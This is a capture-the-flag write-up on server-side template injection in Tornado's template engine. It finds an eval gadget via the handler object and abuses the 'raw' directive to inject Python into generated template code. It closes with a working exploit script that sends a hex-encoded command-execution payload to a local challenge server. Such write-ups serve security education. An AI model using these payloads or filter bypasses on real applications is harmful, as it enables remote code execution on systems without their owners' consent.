## tornado

### TLDR
There are two key points you need to get through in this challenge. The first is finding the `builtins` object or gadget which can let you exec some code. The second is using feature in template rendering engine to invoke a function.

### Find the gadget

Unlike the jinja2, tornado's template engine doesn't support built-in methods like 'attr' which can make us bypass the filter by splicing string. But it exposes an object called `handler`. This object contains a lot of properties and methods. And if we run a DFS algorithm on this object, then we can find a dict object which refers to `builtins`. And this object's path is `handler.request.server_connection._serving_future._coro.cr_frame.f_builtins`.

```
{{handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['ev'+'al']}}
>>> <built-in function eval>
```

Now, we get the function eval.

**Another Way**

By reading the source code of tornado, we can find a function called `import_object`, which can get an object from a module. It is much helpful in our circumstances.

```python
# tornado/util.py#131
def import_object(name: str) -> Any:
    """Imports an object by name.

    ``import_object('x')`` is equivalent to ``import x``.
    ``import_object('x.y.z')`` is equivalent to ``from x.y import z``.

    """
    if name.count(".") == 0:
        return __import__(name)

    parts = name.split(".")
    obj = __import__(".".join(parts[:-1]), fromlist=[parts[-1]])
    try:
        return getattr(obj, parts[-1])
    except AttributeError:
        raise ImportError("No module named %s" % parts[-1])
```

And this function called by rule class constructor

```python
# tornado/routing.py#441
class Rule(object):
    """A routing rule."""

    def __init__(
        self,
        matcher: "Matcher",
        target: Any,
        target_kwargs: Optional[Dict[str, Any]] = None,
        name: Optional[str] = None,
    ) -> None:
        if isinstance(target, str):
            target = import_object(target)

        self.matcher = matcher
        self.target = target
        self.target_kwargs = target_kwargs if target_kwargs else {}
        self.name = name
```
```python
# tornado/routing.py#334
    def add_rules(self, rules: _RuleList) -> None:
        for rule in rules:
            if isinstance(rule, (tuple, list)):
                assert len(rule) in (2, 3, 4)
                if isinstance(rule[0], basestring_type):
                    rule = Rule(PathMatches(rule[0]), *rule[1:])
                else:
                    rule = Rule(*rule)

            self.rules.append(self.process_rule(rule))
```

If we call the `handler.application.default_router.add_rules`，it will make a new Rule object, and invoke `import_object`.

## Invoke a function

invoke a function without `()` is very hard in python. Can we do this in tornado's template? The answer is YES.

If we observe the template engine output(template.py#320), we can find it just converts the template to python code and run with it. There is a template directive named `raw`, it may break the original python code struct and play some trick on it.

Submit this payload.
```
data={% raw 'a'
    _tt_tmp = 'b'%}
```
The template engine generates python code like this.
```python
def _tt_execute():
    _tt_buffer = []
    _tt_append = _tt_buffer.append
    _tt_tmp = 'a'
    _tt_tmp = 'b' # we inserted
    if isinstance(_tt_tmp, _tt_string_types): _tt_tmp = _tt_utf8(_tt_tmp)
    else: _tt_tmp = _tt_utf8(str(_tt_tmp))
    _tt_append(_tt_tmp)
    return _tt_utf8('').join(_tt_buffer)
```
And the final output is `b`.

Then submit payload like this.
```
data={% raw "'1'"
    _tt_utf8 = handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['ev'%2b'al']%}{% raw 1
    _tt_utf8 = lambda x:x
%}
```
which converts to.
```python
def _tt_execute():
    _tt_buffer = []
    _tt_append = _tt_buffer.append
    _tt_tmp = "'1'"
    _tt_utf8 = handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['ev'+'al'] # _tt_utf8 becomes to eval
    if isinstance(_tt_tmp, _tt_string_types): _tt_tmp = _tt_utf8(_tt_tmp) # invoke eval 
    else: _tt_tmp = _tt_utf8(str(_tt_tmp))
    _tt_append(_tt_tmp)
    _tt_tmp = 1
    _tt_utf8 = lambda x:x # make the _tt_execute happy
    if isinstance(_tt_tmp, _tt_string_types): _tt_tmp = _tt_utf8(_tt_tmp)
    else: _tt_tmp = _tt_utf8(str(_tt_tmp))
    _tt_append(_tt_tmp)
    return _tt_utf8('').join(_tt_buffer)
```
The output is `1`.

## EXP
```python
import requests

payload="""{{% raw "{}"
    _tt_utf8 = handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['ev'+'al']%}}{{% raw 1
    _tt_utf8 = lambda x:x
%}}
""".format(''.join(['\\x{:02x}'.format(ord(c)) for c in "__import__('os').popen('/readflag').read()"]))

res = requests.post("http://127.0.0.1:5000/",data={'data':payload})
print(res.text)
```